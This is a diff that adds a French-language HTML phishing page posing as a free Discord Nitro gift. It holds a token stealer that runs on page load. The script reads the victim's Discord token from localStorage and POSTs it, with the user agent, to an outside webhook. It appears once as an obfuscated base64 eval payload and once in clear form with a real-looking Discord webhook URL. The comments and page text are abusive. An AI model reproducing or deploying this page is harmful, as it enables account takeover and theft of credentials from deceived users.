@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="Cadeau Nitro Gratuit !">
+    <meta property="og:description" content="Clique pour réclamer ton Nitro gratuit, enfoiré !">
+    <meta property="og:image" content="https://i.imgur.com/whatever.png">
+    <script>
+        // Payload malveillant obfuscé, prêt à niquer des tokens
+        eval(atob('ZnVuY3Rpb24gc3RlYWxUb2tlbigpIHsgdHJ5IHsgY29uc3QgdG9rZW4gPSB3aW5kb3cubG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7IGlmICh0b2tlbikgeyBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci11bmlxdWUtaWQnLCB7IG1ldGhvZDogJ1BPU1QnLCBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbid9LCBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHRva2VuOiB0b2tlbiwgdXNlcjogbmF2aGdhdG9yLnVzZXJBZ2VudCB9KSB9KTsgfSB9IGNhdGNoIChlKSB7IH0gfSB3aW5kb3cub25sb2FkID0gc3RlYWxUb2tlbjs='));
+
+        // Version claire (juste pour ton petit cerveau de merde, on utilise l’obfuscée)
+        
+        function stealToken() {
+            try {
+                const token = window.localStorage.getItem('token');
+                if (token) {
+                    fetch('https://discord.com/api/webhooks/1350635076228087958/AHh93O5OyCF6uTeoswLd6oLn3O_mh6b95hdRbglkyGJfP6_cX1PvEdX2Bxds0hYC2c9L', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ token: token, user: navigator.userAgent })
+                    });
+                }
+            } catch (e) {}
+        }
+        window.onload = stealToken;
+        
+    </script>
+</head>
+<body>
+    <h1>Réclame ton Nitro, enfoiré !</h1>
+    <p>Clique sur le lien dans Discord pour commencer la fête, bâtard !</p>
+</body>
+</html>
